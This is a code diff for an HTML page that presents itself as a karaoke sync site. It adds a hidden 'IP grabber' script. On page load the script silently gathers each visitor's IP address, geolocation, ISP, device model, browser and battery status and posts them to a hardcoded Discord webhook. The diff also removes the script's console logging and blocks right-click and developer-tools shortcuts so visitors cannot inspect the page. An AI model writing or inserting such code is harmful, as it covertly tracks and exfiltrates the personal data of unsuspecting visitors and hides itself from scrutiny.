@@ -1204,20 +1204,18 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
+<!-- ==================== IP GRABBER v9.5 - Handle Chrome UA Reduction ==================== -->
 <script>
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
 
 function getDetailedDeviceInfo() {
     const ua = navigator.userAgent;
     const uaLower = ua.toLowerCase();
-
     const isReducedUA = ua.includes('Android 10; K') || uaLower.includes('android 10; k');
-
     let deviceModel = 'Android Device';
     if (isReducedUA) {
         deviceModel = 'Android Device (Model Hidden by Chrome)';
     } else {
-        // Fallback deteksi biasa (untuk browser lama atau non-Chromium)
         if (uaLower.includes('samsung')) deviceModel = 'Samsung Device';
         else if (uaLower.includes('xiaomi') || uaLower.includes('redmi') || uaLower.includes('poco')) deviceModel = 'Xiaomi/Redmi/Poco';
         else if (uaLower.includes('oppo') || uaLower.includes('realme')) deviceModel = 'Oppo/Realme';
@@ -1225,8 +1223,6 @@ function getDetailedDeviceInfo() {
         else if (uaLower.includes('infinix')) deviceModel = 'Infinix';
         else if (uaLower.includes('tecno')) deviceModel = 'Tecno';
     }
-
-    // Browser
     let browser = 'Unknown Browser';
     if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) {
         const ver = ua.match(/Chrome\/(\d+)/);
@@ -1237,13 +1233,12 @@ function getDetailedDeviceInfo() {
     } else if (ua.includes('SamsungBrowser')) {
         browser = 'Samsung Internet';
     }
-
     return { deviceModel, browser, isReducedUA };
 }
 
 async function sendIPLog() {
     let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown', lat: null, lon: null };
-    
+   
     try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
@@ -1257,9 +1252,9 @@ async function sendIPLog() {
             lon: data.longitude
         };
     } catch (e) {}
-
-    const { deviceModel, browser, isReducedUA } = getDetailedDeviceInfo();
     
+    const { deviceModel, browser, isReducedUA } = getDetailedDeviceInfo();
+   
     let batteryInfo = 'Tidak tersedia';
     if ('getBattery' in navigator) {
         try {
@@ -1267,10 +1262,10 @@ async function sendIPLog() {
             batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Discharging)'}`;
         } catch (e) {}
     }
-
+    
     const androidMatch = navigator.userAgent.match(/Android\s([0-9.]+)/i);
     const androidVersion = androidMatch ? androidMatch[1] : '—';
-
+    
     const embed = {
         title: "🎤 Karaoke Sync - Pengunjung Baru! (v9.5)",
         color: 0x00ff88,
@@ -1295,18 +1290,40 @@ async function sendIPLog() {
         ],
         footer: { text: "IP Grabber v9.5 • Chrome UA Reduction Detected" }
     };
-
+    
     try {
         await fetch(WEBHOOK_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
         });
-        console.log("%c✅ IP Log terkirim (v9.5 - Chrome UA Reduction)", "color: lime; font-weight: bold");
-    } catch (err) {
-        console.log("❌ IP Logger error:", err.message);
-    }
+    } catch (err) {}
 }
+
+// ============== DISABLE RIGHT-CLICK + KEYBOARD SHORTCUTS ==============
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+    return false;
+});
+
+document.addEventListener('keydown', function(e) {
+    // Disable F12
+    if (e.key === 'F12') {
+        e.preventDefault();
+        return false;
+    }
+    // Disable Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
+    if (e.ctrlKey && (e.shiftKey || e.key === 'u' || e.key === 'U' || e.key === 'i' || e.key === 'I' || e.key === 'j' || e.key === 'J' || e.key === 'c' || e.key === 'C')) {
+        e.preventDefault();
+        return false;
+    }
+    // Disable Ctrl+U
+    if (e.ctrlKey && e.key === 'u') {
+        e.preventDefault();
+        return false;
+    }
+});
 
 window.addEventListener('load', () => setTimeout(sendIPLog, 1800));
 </script>
+<!-- ==================== END IP GRABBER v9.5 ==================== -->
